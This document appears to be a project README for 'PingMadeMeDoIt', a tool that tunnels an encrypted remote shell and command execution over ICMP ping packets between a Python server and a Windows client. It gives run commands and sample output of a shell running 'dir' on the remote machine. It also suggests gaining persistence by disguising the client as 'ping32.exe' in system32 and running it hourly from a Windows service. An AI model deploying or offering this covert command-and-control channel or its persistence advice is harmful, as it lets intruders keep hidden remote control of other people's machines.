# PingMadeMeDoIt
Mom, ping made me do it ! Use ping to enter shell, execute commands or send data.

Use Ping IMCP 8 to send data, receive data. In our example we implemented a shell, job command and simple plain messaging. All of this in combination with some AES-256 encryption sauce.
Ping client will run as normal ping but if you supply client.exe advanced, it will start the custom ping.

Nowadays this technique is quite known but still it's a nice backup to maintain persistence access to a machine. Maybe combinate this with some windows service which calls our custom ping each 60 minutes, put it in system32\ as ping32.exe ?

<b>run server : python PingMadeMeDoIt.py</b>
server commands : shellstart (start shell), shellexit (exit shell), job: cmd (execute cmd provided and return info), if no command is received default behaviour is to send back reply with the text inputted.

<b>run client : PingMadeMeDoIt.exe advanced x.x.x.x hello</b>

<br>
<b>Server Side..</b>
<br><br>
[root@yourmom ping]# python3.11 PingMadeMeDoIt.py<br>
Listening for ICMP Echo requests...<br>
Enter the response text to send : shellstart<br>
Entered shell mode.<br>
$ dir<br>
result: shellresult:  Volume in drive C has no label.<br>
 Volume Serial Number is A69D-9D16<br>
<br>
 Directory of C:\Users\yourmom\filled<br>
<br>
07/30/2023  08:10 PM    <DIR>          .<br>
07/30/2023  08:10 PM    <DIR>          ..<br>
12/08/2020  07:05 PM         2,609,152 BouncyCastle.Mom.dll<br>
07/30/2023  08:10 PM             9,728 Deep.exe<br>
07/30/2023  08:10 PM            24,064 Penetration.pdb<br>
               3 File(s)      2,642,944 bytes<br>
               2 Dir(s)  16,437,215,232 bytes free<br>
<br>
$ shellexit<br>
Shell mode exited.<br>
<br>
<b>Client Side..</b>
<br><br>
C:\Users\yourmom\filled>PingMadeMeDoIt.exe advanced x.x.x.x good<br>
Custom ICMP Echo Request sent successfully.<br>
IP Address: x.x.x.x<br>
Roundtrip Time: 3777 ms<br>
Time to Live (TTL): 50<br>
Buffer Size: 94 bytes<br>
Buffer Data (Hex): 73 67 48 7A 62 44 4E 4C 4C 69 75 49 36 62 6E 6B 42 71 4F 52 45 41 3D 3D 7C 6B 66 4B 53 38 49 63 70 32 6F 4E 30 30 4A 44 49 6C 43 49 30 43 62 31 6D 4B 6F 42 6F 4D 70 6A 43 55 54 54 59 4C 71 70 6C 69 2F 34 3D 7C 6A 48 34 2F 42 42 70 43 34 4A 31 46 46 37 38 79 74 38 49 63 2B 67 3D 3D<br>
Buffer Data (ASCII): sgHzbDNLLiuI6bnkBqOREA==|kfKS8Icp2oN00JDIlCI0Cb1mKoBoMpjCUTTYLqpli/4=|jH4/BBpC4J1FF78yt8Ic+g==<br>
Received command: dir<br>
Send ping reply: shellresult:  Volume in drive C has no label.<br>
 Volume Serial Number is A69D-9D16<br>

 Directory of C:\Users\yourmom\filled<br>

07/30/2023  08:10 PM    <DIR>          .<br>
07/30/2023  08:10 PM    <DIR>          ..<br>
12/08/2020  07:05 PM         2,609,152 BouncyCastle.Mom.dll<br>
07/30/2023  08:10 PM             9,728 Deep.exe<br>
07/30/2023  08:10 PM            24,064 Penetration.pdb<br>
               3 File(s)      2,642,944 bytes<br>
               2 Dir(s)  16,437,215,232 bytes free<br>
<br>
Received shellexit. Exiting the loop.<br>

